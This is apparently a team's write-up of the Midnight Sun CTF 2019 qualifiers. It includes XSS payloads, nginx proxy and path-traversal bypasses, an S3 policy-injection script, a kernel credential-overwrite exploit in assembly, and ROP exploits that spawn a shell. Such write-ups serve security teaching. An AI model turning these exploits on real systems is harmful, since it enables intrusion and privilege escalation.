# Midnight Sun CTF 2019 Quals

**It's recommended to read our responsive [web version](https://balsn.tw/ctf_writeup/20190406-midnightsunctf/) of this writeup.**


 - [Midnight Sun CTF 2019 Quals](#midnight-sun-ctf-2019-quals)
   - [Reverse](#reverse)
     - [Hfs-mbr](#hfs-mbr)
     - [Hfs-vm](#hfs-vm)
   - [Web](#web)
     - [Marcozuckerbergo](#marcozuckerbergo)
     - [Marcodowno](#marcodowno)
     - [Bigspin](#bigspin)
     - [Cloudb](#cloudb)
   - [Pwn](#pwn)
     - [Hfsipc](#hfsipc)
     - [Hfs-mbr](#hfs-mbr-1)
     - [Hfs-vm](#hfs-vm-1)
   - [Crypto](#crypto)
     - [Pgp-com](#pgp-com)
     - [EZDSA](#ezdsa)
     - [Open-gyckel-krypto](#open-gyckel-krypto)
     - [Tulpan257](#tulpan257)


## Reverse

### Hfs-mbr

- The mbr code is in dos.img
- Use IDA then you can reverse the code
- You can find a jump table and the offset based on your input character
- Only nine characters have some check operations and you can easily find out that it indicate the order of those characters. 
- Finally, you will find the password `sojupwner`
- And the flag is `midnight{w0ah_Sh!t_jU5t_g0t_REALmode}`

### Hfs-vm
- First we can find out that at the beginning the process will fork.
- The parent process acts like syscall handler. For instance, it can call system('ls') or read flag1
- The child process is like a vm, it takes our input and execute it.
- After a while you can find that what you have to do is using syscall to read flag1 and print it out.
- At first, increase the length of stack. Then, call syscall `0x3` to read flag1 to the shared memory buffer. In the end, call syscall `0x1` to print flag1 in the buffer.
- The flag is `midnight{m3_h4bl0_vm}`

## Web

### Marcozuckerbergo

- It should be easy to notice that the website uses mermaid library
- Try to search some XSS PoC for mermaid on website
- Then I got this https://github.com/benweet/stackedit/issues/1457
- So the payload will be `http://marcozuckerbergo-01.play.midnightsunctf.se:3002/markdown?input=graph%20LR%0aid1["<iframe%20src=javascript:alert(%271%27)></iframe>"]`
- And the flag is `midnight{1_gu3zz_7rust1ng_l1bs_d1dnt_w0rk_3ither:(}`

### Marcodowno

- This challenge filter and replace our input:


```javascript=
function markdown(text){
  text = text.replace(/[<]/g, '')
  .replace(/----/g,'<hr>')
  .replace(/> ?([^\n]+)/g, '<blockquote>$1</blockquote>')
  .replace(/\*\*([^*]+)\*\*/g, '<b>$1</b>')
  .replace(/__([^_]+)__/g, '<b>$1</b>')
  .replace(/\*([^\s][^*]+)\*/g, '<i>$1</i>')
  .replace(/\* ([^*]+)/g, '<li>$1</li>')
  .replace(/##### ([^#\n]+)/g, '<h5>$1</h5>')
  .replace(/#### ([^#\n]+)/g, '<h4>$1</h4>')
  .replace(/### ([^#\n]+)/g, '<h3>$1</h3>')
  .replace(/## ([^#\n]+)/g, '<h2>$1</h2>')
  .replace(/# ([^#\n]+)/g, '<h1>$1</h1>')
  .replace(/(?<!\()(https?:\/\/[a-zA-Z0-9./?#-]+)/g, '<a href="$1">$1</a>')
  .replace(/!\[([^\]]+)\]\((https?:\/\/[a-zA-Z0-9./?#]+)\)/g, '<img src="$2" alt="$1"/>')
  .replace(/(?<!!)\[([^\]]+)\]\((https?:\/\/[a-zA-Z0-9./?#-]+)\)/g, '<a href="$2">$1</a>')
  .replace(/`([^`]+)`/g, '<code>$1</code>')
  .replace(/```([^`]+)```/g, '<code>$1</code>')
  .replace(/\n/g, "<br>");
  return text;
}

window.onload=function(){
  $("#markdown").text(input);
  $("#rendered").html(markdown(input));
}

```
- Our goal is to pop `alert(1)` on chrome environment.
- We can close double quote of `<img>`'s `alt` attribute.
- Payload:
    - `![ " onerror=alert(1) ](https://kaibrotw)`
- `midnight{wh0_n33ds_libs_wh3n_U_g0t_reg3x?}`

### Bigspin

- This challenge give us four link: `/admin/`, `/uberadmin/`, `/user/`, `/pleb/`
	- `/admin/` => 404
	- `/uberadmin/` => 403
	- `/user/` => 403
	- `/pleb/` => 200
- The content of `/pleb/` is:
	- ![](https://i.imgur.com/aivIgPE.png)
	- same as `example.com`
- Fuzzing it!
	- `/pleb./` => 200
	- `/ple%62/` => 200
	- `/pleb` => 404
	- `/pleb:` => 500
	- `/pleb../` => 502
	- `/pleba/` => 502
	- ...
- So we can guess the proxy rule may look like:
	- `/pleb[INPUT]` => `example.com[INPUT]`
	- Testing with DNS LOG: `/pleb.kaibro.tw`
	- Received a request: `example.com.kaibro.tw`
- Set `example.com.gg.kaibro.tw` to point `127.0.0.1`
	- Then we can visit `/pleb.gg.kaibro.tw/user/` now.
	- There is only one file `nginx.c%C3%B6nf%20` under `/user/`
	- Double encode the filename and read it:


```
worker_processes 1;
user nobody nobody;
error_log /dev/stdout;
pid /tmp/nginx.pid;
events {
  worker_connections 1024;
}

http {

    # Set an array of temp and cache files options that otherwise defaults to
    # restricted locations accessible only to root.

    client_body_temp_path /tmp/client_body;
    fastcgi_temp_path /tmp/fastcgi_temp;
    proxy_temp_path /tmp/proxy_temp;
    scgi_temp_path /tmp/scgi_temp;
    uwsgi_temp_path /tmp/uwsgi_temp;
    resolver 8.8.8.8 ipv6=off;

    server {
        listen 80;

        location / {
            root /var/www/html/public;
            try_files $uri $uri/index.html $uri/ =404;
        }

        location /user {
            allow 127.0.0.1;
            deny all;
            autoindex on;
            root /var/www/html/;
        }

        location /admin {
            internal;
            autoindex on;
            alias /var/www/html/admin/;
        }

        location /uberadmin {
            allow 0.13.3.7;
            deny all;
            autoindex on;
            alias /var/www/html/uberadmin/;
        }

        location ~ /pleb([/a-zA-Z0-9.:%]+) {
            proxy_pass   http://example.com$1;
        }

        access_log /dev/stdout;
        error_log /dev/stdout;
    }

}

```

- `/admin` is `internal;`
	- only allow internal requests
- `/uberadmin` only allow IP `0.13.3.7`

- How to bypass these restrictions?
	- `X-Accel-Redirect` header can bypass the `internal` restriction.
	- https://www.nginx.com/resources/wiki/start/topics/examples/x-accel/
	- > X-accel allows for internal redirection to a location determined by a header returned from a backend.
- Run a web server and send header with `proxy_pass` to bypass `/admin` restriction:


```python=
#!/usr/bin/env python3
from flask import Flask, current_app, request, make_response

app = Flask(__name__)

@app.route('/')
def index():
    response = make_response()
    response.headers['X-Accel-Redirect'] = '/admin/flag.txt'
    return response

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, threaded=True)

```

- the content of `/admin/flag.txt`:
	- `hmmm, should admins really get flags? seems like an uberadmin thing to me`
	- so we need to bypass `/uberadmin`

- There is a **Path Traversal vulnerability** in the Nginx config:
	- `/admin` alias to `/var/www/html/admin/`
	- No trailing slash on `/admin`
	- We can visit parent directory by `/admin../`


```
location /admin {
    internal;
    autoindex on;
    alias /var/www/html/admin/;
}

```

- Read `/admin../uberadmin/flag.txt`
	- `midnight{y0u_sp1n_m3_r1ght_r0und_b@by}`

### Cloudb

First, there is a hidden key in the form. Thus it uses Amazon S3 as backend:


```
<input type="hidden" name="AWSAccessKeyId" id="AWSAccessKeyId" value="AKIAJQSA73ND6ITM5ETQ">

```

And the user's information is saved at `http://cloudb-01.play.midnightsunctf.se/userinfo/dw0fjw02@dw0fjw02.dw/info.json`:


```
{"admin": false, "hmac": "925adf8ba3226f0f007bb64906c7dddd681cb49e7bc2545408cc6fb2624d0fce", "name": "dw0fjw02", "email": "dw0fjw02@dw0fjw02.dw"}

```

If we randomly type a email, the server will return a Amazon S3 bucket error message. It seems to reversely proxy the request.


```
$ curl http://cloudb-01.play.midnightsunctf.se/userinfo/notexist/info.json      

<?xml version="1.0" encoding="UTF-8"?>
<Error><Code>AccessDenied</Code><Message>Access Denied</Message><RequestId>AE1BE93D22D87D89</RequestId><HostId>2XyKdz5M+7hnK+Y7Bvl6J35ZoMjmrpSEux7C5jDGx+RuTUw4d/Q/4JfFzpHm69jfIYo4ZfFagoE=</HostId></Error>

```

So obviously, we have to somehow modify the JSON file in Amazon S3 to set "admin" true. 

After logging in, we are able to change our profile pictures. The profile picture is directly saved in another Amazon S3 without the server proxying the request. This workflow is as follows

- Amazon HTTP POST API required a [policy](https://docs.aws.amazon.com/AmazonS3/latest/API/sigv4-HTTPPOSTConstructPolicy.html) which specifies conditions that the request must meet.
- An XML HTTP request is sent to generate the policy and proper signatures (keys): `http://cloudb-01.play.midnightsunctf.se/signature?acl=public-read&hmac=....`
- Note the hmac parameter has nothing to do with Amazon S3. The hmac is computed in client-side in `static/app.min.js`. The hmac key is not `cl0udb_Pr0d_Do_NOT_d1sclose`. Instead, it's `[object Object]`. Not sure if it's intentional or not XD
- Next, send POST request including the pictures and policy to S3 cucket: `https://cloudb-profilepics.s3.amazonaws.com/`
- Then the profile picture is available at `http://cloudb-01.play.midnightsunctf.se/profilepics/awdawdaf@adwdaw.com.png`


The policy is in JSON format:


```
{
                'expiration': '2019-04-09T03:01:48.000Z',
                'conditions': [
                    ['content-length-range', 1, 10000], {'bucket': 'cloudb-profilepics'},
                    {'acl': 'public-read'},
                    ['starts-with', '$key', 'profilepics/']
                ]
}

```

Since the condition contains `starts-with`, we cannot overwrite `userinfo/[email]/info.json`. However, the policy returned from the server is injectable. The GET parameter `acl=puclic-read` can be injected with quotes. Although S3 bucket will validate the JSON format, we can simply bypass its validation using capitalized words "Conditions". Therefore we can get rid of the annoying `starts-with` condition.


```json
{
                'expiration': '2019-04-09T03:16:49.000Z',
                'conditions': [
                    ['content-length-range', 1, 10000], {'bucket': 'cloudb-profilepics'},
                    {'acl': 'a'}
                ],
                'conditions': [
                    {'acl': 'public-read'},
                    ['starts-with', '$bucket', ''],
                    ['starts-with', '$key', ''],
                    ['starts-with', '$success_action_status', '']
                ],
                'Conditions': [
                    {'a': 'a'},
                    ['starts-with', '$key', 'profilepics/']
                ]
}

```

There are totally 3 conditions in the JSON policy:

1. This one will be overwritten by the second one.
2. S3 bucket will use this as the condition value.
3. It will simply be ignored. I think S3 will only parse the lowercase `conditions`.

The reason why using uppercase `Conditions` here is if we use an arbitrary word like `foobar`, S3 will return an error because it's an invalid key.


So we have a unrestricted policy and a totally controlable profile picture. We can overwrite the userinfo now! However, it seems like the userinfo is saved in another S3 bucket. What's worse, we even don't know the bucket name!

After some guessing, the bucket name turns out to be `cloudb-users`. Come on, it's not even `cloudb-userinfo`. I think the challenge is poorly-designed here. After overwriting the `info.json` we can login as admin and get the flag!

Here is the payload:


```python
#!/usr/bin/env python3

import requests
import base64
import hashlib
import hmac

def hmak(x):
    secret = b'[object Object]'
    x = x.encode()
    return hmac.new(secret, msg=x, digestmod=hashlib.sha256).hexdigest()

def b64d(x):
    return base64.b64decode(x.encode()).decode()

s = requests.session()

mail = 'heaton@heaton.tw'
password = 'slowpoke'
hm = hmak(mail+password)
data = {
    'key': (None, f'users/{mail}/info.json'),
    'AWSAccessKeyId': (None, 'AKIAJQSA73ND6ITM5ETQ'),

    # https://docs.aws.amazon.com/AmazonS3/latest/API/sigv4-HTTPPOSTForms.html
    'success_action_status': 201,

    # https://stackoverflow.com/a/15235866
    'policy': None,
    'signature': None,

    'acl': (None, 'public-read'),
    'file': ('a.png', b'{' + f'''
"admin": true, "hmac": "{hm}", "name": "heaton", "email": "{mail}"
'''.encode() + b'}'),
}
print(data)
acl = '''
a'}],


'conditions': [
{'acl': 'public-read'},
['starts-with', '$bucket', ''],
['starts-with', '$key', ''],
['starts-with', '$success_action_status', '']
],


'Conditions': [{'a': 'a
'''.replace('\n', '')

r = s.get('http://cloudb-01.play.midnightsunctf.se/signature', params={
    'acl': acl,
    'hmac': hmak(acl),
})
print(r.text)
policy, sig = r.text.split(':')

print(b64d(policy))

data['policy'] = (None, policy)
data['signature'] = (None, sig)
r = s.post('https://cloudb-users.s3.amazonaws.com/', files=data) #multipart/form-data
print(r.status_code) # 204 means success
print(r.text)

```

Flag: `midnight{n3x7_t1m3_w3ll_d0_1t_Cl0udl3sslY}`


## Pwn
### Hfsipc
Off-by-one byte overflow:

```c
if ( buf[1] <= (unsigned __int64)(c->size + 1) )
      {
        if ( !copy_from_user(c->ptr, buf[2], buf[1]) )
        {
          r = 0LL;
          printk(a6hfsIpcWroteZu, buf[1], (unsigned int)idx);

```
Default allocator of the Linux kernel - SLUB.

We can modify `fd` of `kmalloc_caches[5]` by Off-by-one byte overflow.
Create channel 2, `buf` of channel 2 will `kmem_cache_alloc` a `kmalloc_caches[5]` which is overlap with channel 1 structure, so that we can forge a fake channel structure to read/write everywhere in kernel.

Traverse circular linked list of tasks start from `init_task`, `struct list_head tasks`(offset 0x1d0) , overwrite `task->real_cred`(offset 0x3b8) `task->cred`(offset 0x3c0).

```nasm
[BITS 64]
; nasm -f elf64 pwn.S -o pwn.o && ld pwn.o -o pwn

global _start

section .text

_start:
	mov rdi, dev			; /dev/hfs
	mov rsi, 2
	mov rdx, 0
	mov rax, 2
	syscall				; open( "/dev/hfs" , O_RDWR , 0 ) = 3

	mov qword [arg], 0 	 	; id
	mov qword [arg+8], 0x20 	; size
	call create

        mov qword [arg], 1            
        mov qword [arg+8], 0x20          
	call create

	mov qword [arg], 1           
        mov qword [arg+8], 0x21      
        mov qword [arg+0x10], pwn    ; payload
        call write

	mov qword [arg], 3              
        mov qword [arg+8], 0x20         
        call create			; Overlap!


	mov qword [i], 0
	mov qword [base], 0xffffffff81a1b4c0 ; init_task
	add qword [base], 0x1d0 ; init_task->tasks
				 ; struct list_head tasks;
loop:
	mov rbx, qword [base]
	sub rbx, 0x1d0
	add rbx, 0x3c0			; &(p->cred)      const struct cred __rcu *cred;
	mov qword [fake + 8], rbx
        call dump 			; a = &(p->cred)

	mov rbx, qword [a]		; rbx = p->cred
	add rbx, 4
	mov qword [fake + 8], rbx	


	mov qword [fake + 16], 0x20
	mov qword [arg], 3              
        mov qword [arg+8], 0x20         
        mov qword [arg+0x10], fake      ; fake obj
        call write

        mov qword [arg], 0              ; id
        mov qword [arg+8], 0x20         ; size
        mov qword [arg+16], cred        ; overwrite p->cred + 4
        call write


	mov qword [fake + 16], 8

	mov rbx, qword [base]
	mov qword [fake + 8], rbx
	call dump 			; a = &(p->tasks.next)

	mov rbx, qword [a]
	mov qword [base], rbx		; [base] = p->tasks.next

	add qword [i], 1
	cmp qword [i], 25		; make sure to traverse full circular linked list
	jne loop
exit:
	xor rdi, rdi
	mov rax, 0x3c
	syscall


dump:
	mov qword [arg], 3              ; id
        mov qword [arg+8], 0x20         ; size
        mov qword [arg+0x10], fake      ; fake obj
	call write

	mov qword [arg], 0              ; id
        mov qword [arg+8], 8		; size
	mov qword [arg+16], a		; copy to a
        call read
	ret
set:
	mov qword [arg], 3              ; id
        mov qword [arg+8], 0x20         ; size
        mov qword [arg+0x10], fake      ; fake obj
        call write

        mov qword [arg], 0          ; id
        mov qword [arg+8], 8        ; size
        mov qword [arg+16], a       ; copy from a
        call write
        ret

print_a:
	mov rdi, 1
	mov rsi, a
        mov rdx, 9
        mov rax, 1
        syscall
	ret

create:
	mov rdi, 3
	mov rsi, 0xABCD0001
	mov rdx, arg
	mov rax, 16
	syscall
	ret
delete:
	mov rdi, 3
	mov rsi, 0xABCD0002
	mov rdx, arg
	mov rax, 16
	syscall
	ret
read:
	mov rdi, 3
	mov rsi, 0xABCD0003
	mov rdx, arg
	mov rax, 16
	syscall
	ret
write:
	mov rdi, 3
	mov rsi, 0xABCD0004
	mov rdx, arg
	mov rax, 16
	syscall
	ret


section .data

pwn:	db	"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" , 0x40 , 0
fake:	dq	0 , 0 , 8
arg:	dq	0 , 0 , 0
cred:	dq	0 , 0 , 0 , 0

a:	dq	0 , 0xa
i:	dq	0
base:	dq	0 , 0xa

dev:    db      "/dev/hfs",0

```
![](https://i.imgur.com/Djl89aF.png)

### Hfs-mbr

- When the input character is \x7f. The pointer of buffer move backward
- So we can use this vulnerability to overwrite the filename and function pointer then we can make it output flag2


```python=
from pwn import *

r=remote("hfs-os-01.play.midnightsunctf.se", 31337)
r.recvuntil("[HFS_MBR]>")
r.sendline("sojupwner")
r.recvuntil("[HFS-DOS]>")
r.send("\x7f"*3+"2"+"\x7f"*17+"O\x0d")
r.interactive() #midnight{th4t_was_n0t_4_buG_1t_is_a_fEatuR3}


```



### Hfs-vm

- You can find out that there are some operations can let you do read and write on stack.
- So you can leak the libc's base address, text's base address and stack's base address. Also you can overwrite the return address and trigger your rop-chain. However the length of code is not enough, you may need stack migration.
- Unfortunately the child process is limited by `SECCOMP_MODE_STRICT`. We cannot control child process to get shell. We need to compromise parent process.
- There is a shared memory buffer between child process and parent process. We use this buffer to do some buffer overflow. We can use race condition. I found that syscall `0x4` will trigger sleep. It give us the perfect timing to modify the content of shared buffer and trigger buffer overflow.
- There is one more thing that stop us from getting shell: The parent process modify its canary. So we have leak the modified canary first, then just get  the shell.



```python=
from pwn import *
import time
#r=gdb.debug("./hfs-vm",ggg)
#r=process("./hfs-vm")
poprdi=0x1e83
poprdx=0x101d
poprsi=0x198f
poprbp=0xe28
poprsp=0x1112
aaa=0x38
readd=0xca0
wwrr=0xc10
ssyscall=0x16b0
memcpy=0xcc0
sleeppp=0xD60
system=0xc60
def counttt():
  global aaa
  aaa+=1
  return aaa-1
def movv(value):
  return "\xa0\x20"+p32(value)[:2]
def loadss(base):
  pre="\x80\x20"+p32(base)[:2]+"\xa8\x08\x00\x00"
  return pre
def change(value,old):
  sub="\xa2\x20"+p32(old)[:2]
  add="\xa1\x20"+p32(value)[:2]

  return sub+add
def subbb(vv):
  sub="\xa2\x20"+p32(vv)[:2]

  return sub
def writehere(base):
  base="\x80\x20"+p32(base)[:2]
  overwrite="\x87\x0a\x00\x00"
  return base+overwrite
r=remote("hfs-vm-01.play.midnightsunctf.se", 4096)



payload=("\x00\x20\x00\x04\x20\x20\x04\x00\x40\x20\x00\x01"
+loadss(0x34)+change(poprsi,0xe6e)+writehere(0x34)
+loadss(0x48)+subbb(0x1000)+writehere(counttt())
+"\x0a\x00\x00\x00"
+loadss(0x49)+writehere(counttt())
+"\x0a\x00\x00\x00"
+loadss(0x4a)+writehere(counttt())
+"\x0a\x00\x00\x00"
+loadss(0x4b)+writehere(counttt())
+"\x0a\x00\x00\x00"
+loadss(0x34)+change(poprdx,poprsi)+writehere(counttt())
+"\x0a\x00\x00\x00"
+loadss(0x35)+writehere(counttt())
+"\x0a\x00\x00\x00"
+loadss(0x36)+writehere(counttt())
+"\x0a\x00\x00\x00"
+loadss(0x37)+writehere(counttt())
+"\x0a\x00\x00\x00"
+movv(128)+writehere(counttt())
+movv(0x0)+writehere(counttt())
+writehere(counttt())
+writehere(counttt())
+loadss(0x34)+change(poprdi,poprsi)+writehere(counttt())
+loadss(0x35)+writehere(counttt())
+loadss(0x36)+writehere(counttt())
+loadss(0x37)+writehere(counttt())
+movv(0x1)+writehere(counttt())
+movv(0x0)+writehere(counttt())
+writehere(counttt())
+writehere(counttt())
+loadss(0x34)+change(readd,poprsi)+writehere(counttt())
+loadss(0x35)+writehere(counttt())
+loadss(0x36)+writehere(counttt())
+loadss(0x37)+writehere(counttt())
+loadss(0x34)+change(poprsp,poprsi)+writehere(counttt())
+loadss(0x35)+writehere(counttt())
+loadss(0x36)+writehere(counttt())
+loadss(0x37)+writehere(counttt())



+loadss(0x38)+writehere(counttt())
+loadss(0x39)+writehere(counttt())
+loadss(0x3a)+writehere(counttt())
+loadss(0x3b)+writehere(counttt())

) # leak all the base address we need and do stack migration

r.sendline(str(len(payload)))
print len(payload)



#gdb.attach(r)
#raw_input()
r.send(payload)
text=0
stack=0
for i in range(4):
  r.recvuntil("REG_05:")
  a=r.recvline()
  c=int(a,16)
  #print hex(c)
  stack+=c<<(16*i)
print hex(stack)
for i in range(4):
  r.recvuntil("REG_05:")
  a=r.recvline()
  c=int(a,16)
  #print hex(c)
  text+=c<<(16*i)
text-=0x101d
print hex(text)

regadd=stack+0xe50
secondpay=(p64(text+poprdi)
+p64(1)
+p64(text+poprsi)
+p64(regadd)
+p64(text+poprdx)
+p64(60)
+p64(text+wwrr)
+p64(text+poprdi)
+p64(0)
+p64(text+poprsi)
+p64(stack-0x500)
+p64(text+poprdx)
+p64(656)
+p64(text+readd)
+p64(text+poprsp)
+p64(stack-0x500)
) # leak shared buffer address and do another stack migration
r.send(secondpay)
print len(secondpay)
r.recvuntil("========================================\n")
a=r.recv()
fd=u64(a[:8])
shared=u64(a[8:16])
print hex(fd)
print hex(shared)

haha=("\x48\x00"
+p64(0xdeadbeaf)*8)
fourpay=(haha
+"\x00\x01"
) #　The payload for leaking parent's canary

thirdpay=(p64(text+poprsi)
+p64(stack-0x1000)
+p64(text+poprdx)
+p64(len(fourpay))
+p64(text+readd)

+p64(text+poprdi)
+p64(shared)
+p64(text+poprsi)
+p64(stack-0x1000)
+p64(text+poprdx)
+p64(0x100)
+p64(text+memcpy)

+p64(text+poprdi)
+p64(fd)
+p64(text+poprsi)
+p64(regadd+0x11)
+p64(text+poprdx)
+p64(0x5)
+p64(text+wwrr)

+p64(text+poprdi)
+p64(0)
+p64(text+poprsi)
+p64(regadd+0x16)
+p64(text+poprdx)
+p64(0x2)
+p64(text+readd)

+p64(text+poprdi)
+p64(shared)
+p64(text+poprsi)
+p64(regadd+0x16)
+p64(text+poprdx)
+p64(0x2)
+p64(text+memcpy)

+p64(text+poprdi)
+p64(fd)
+p64(text+poprsi)
+p64(regadd+0x16)
+p64(text+poprdx)
+p64(0x5)
+p64(text+readd)

+p64(text+poprdi)
+p64(1)
+p64(text+poprsi)
+p64(shared+2)
+p64(text+poprdx)
+p64(0x100)
+p64(text+wwrr)

+p64(text+poprdi)
+p64(0)
+p64(text+poprsi)
+p64(shared)
+p64(text+poprdx)
+p64(144)
+p64(text+readd)

+p64(text+poprdi)
+p64(1)
+p64(text+poprsi)
+p64(shared)
+p64(text+poprdx)
+p64(0x100)
+p64(text+wwrr)

+p64(text+poprdi)
+p64(fd)
+p64(text+poprsi)
+p64(regadd+0x20)
+p64(text+poprdx)
+p64(0x5)
+p64(text+wwrr)

+p64(text+poprdi)
+p64(fd)
+p64(text+poprsi)
+p64(regadd+0x16)
+p64(text+poprdx)
+p64(0x5)
+p64(text+readd)

+p64(text+poprdi)
+p64(1)
+p64(text+poprsi)
+p64(shared)
+p64(text+poprdx)
+p64(0x100)
+p64(text+wwrr)

) # leak parent canary then get shell
print len(thirdpay)



fivepay="\x00\x01"

r.send(thirdpay)
r.send(fourpay)
time.sleep(1)
r.send(fivepay)

jj=r.recv()
canary=jj[0x48:0x48+8]
returnadd=jj[0x78:0x78+8]

print hex(u64(canary))
print hex(u64(returnadd))

finalpay=("/bin/sh\x00"+"\x00"*0x40
+canary+"a"*0x28
+p64(text+poprdi)
+p64(shared+2)
+p64(text+system)
) # The payload for getting shell

print len(finalpay)
r.send("\x90\x00"+finalpay)

r.interactive() #midnight{7h3re5_n0_I_iN_VM_bu7_iF_th3r3_w@s_1t_w0uld_b3_VIM}

```

## Crypto
### Pgp-com

First, extract private key, public keys, and three PGP messages from `pgp-communication.txt`. Try to decrypt the three PGP messages (passphrase: `changemeNOW`):

```shell
gpg --import private.txt
gpg --import public.txt
gpg --output dec1.txt --decrypt msg1.gpg
gpg --output dec2.txt --decrypt msg2.gpg
gpg --output dec3.txt --decrypt msg3.gpg

```
An error occurs when decrypting `msg2.gpg`. However, we get a hint from `dec3.txt`:

```
We have received some indications that our PGP implementation has problems with randomness.

```
Observe the session keys used in `msg1.gpg` and `msg3.gpg`

```shell
gpg --show-session-key -d msg1.gpg
gpg --show-session-key -d msg3.gpg

```
which are

```shell
gpg: session key: `9:0000000000000000000000000000000000000000000000000000000000001336'
gpg: session key: `9:0000000000000000000000000000000000000000000000000000000000001338'

```
And we can guess the session key used in `msg2.gpg`:

```shell
gpg --override-session-key 9:0000000000000000000000000000000000000000000000000000000000001337 -d msg2.gpg

```
Flag: `midnight{sequential_session_is_bad_session}`

### EZDSA
k is generated from a urandom number `u` and our message `m` with:

```
k = pow(self.gen, u * bytes_to_long(m), self.q)

```

If m is the multiplicative order of `Z*/qZ*`, k will be one.
However, there's a assertion prevents us to send such `m`:

```
assert(bytes_to_long(m) % (self.q - 1) != 0)

```

Instead, we can let k be an element in a small subgroup of `Z*/qZ*`, so we can try all possible `k`.
Possible sizes of subgroup is the factor of the order:

```
2 * 3 * 11 * 53 * 10044829213 * 232139128489 * 102485294776585522175741

```

The smallest one is `{1, -1}`, if we send `(q - 1) // 2` as `m`, `k` will always be 1 or -1.
Moreover, `self.gen` is not a generator of `Z*/qZ*`, `k` will always be 1.

Given a signature with `k = 1`, the key (i.e. flag) is `(s - hash) / r`.

### Open-gyckel-krypto

```
Let
    p = a * 10^250 + b
    q = b * 10^250 + a
    where a, b < 10^250

So:
    pq = a * b * 10^500 + (a^2 + b^2) * 10^250 + a * b

Let
    x = a * b % 10^250
    y = a * b // 10^250

We can rewrite pq as:
    pq = y * 10^750 + x * 10^500 + (a^2 + b^2) * 10^250 + y * 10^250 + x

Implies
pq % 10^250 = x
pq // 10^750 will in range [y, y+6]

Given a possible `y`, we can calculate (a^2 + b^2) and a * b to solve a and b.

```

### Tulpan257
We have 107 evaluation results of a degree 26 polynomial.
Some of them are wrong, and the probability of a result to be wrong is 0.4.
If we random select 26 result, the probability of all selected result is correct is about 2e-6, which is very high.
We can keep selecting different results, and reconstruct the polynomial.

To check whether we get the correct polynomial,
just calculate those 107 evaluation results and check whether the error probability is close to 0.4.
